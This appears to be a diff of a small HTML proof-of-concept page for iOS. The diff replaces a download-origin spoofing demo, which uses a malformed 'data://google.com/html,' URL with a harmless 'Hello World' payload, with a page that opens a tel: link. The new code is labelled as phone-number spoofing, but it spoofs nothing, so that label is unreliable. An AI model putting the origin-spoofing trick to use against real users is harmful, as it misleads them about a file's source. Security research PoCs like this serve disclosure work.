@@ -3,36 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download & Origin Spoofing on iOS</title>
+  <title>Phone Call Spoofing on iOS</title>
 </head>
 <body>
-  <center><h2>PoC for Download Origin Spoofing on iOS</h2></center>
+  <center><h2>PoC for Phone Call Spoofing on iOS</h2></center>
 
   <script>
-    // Listen for a keydown event to trigger download
+    // Listen for a keydown event to trigger the phone call
     window.addEventListener('keydown', function(e) {
-      openDownload();
+      initiatePhoneCall();
     });
 
-    // Function to trigger the download using the malformed data URL
-    function openDownload() {
-      // Here I've inserted a simple base64-encoded "Hello World" string as the payload
-      // You can replace this payload with any base64-encoded string for a file
-      const payload = "data:text/plain;base64,SGVsbG8gd29ybGQ="; // "Hello World" in base64
-      initiateDownload("data://google.com/html," + encodeURIComponent(payload), "spoofedfile.txt");
-    }
-
-    // Helper function to initiate the download
-    function initiateDownload(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+    // Function to trigger the phone call with a spoofed number (e.g., fake phone number)
+    function initiatePhoneCall() {
+      // This is a spoofed phone number using the 'tel:' URI scheme
+      // You can replace this with any valid phone number you want to spoof
+      const spoofedPhoneNumber = "tel:+11234567890"; // Fake phone number
+      window.location.href = spoofedPhoneNumber;
     }
   </script>
 
-  <p>Press any key to start the download. The payload is base64-encoded "Hello World".</p>
+  <p>Press any key to initiate a phone call.</p>
 </body>
 </html>
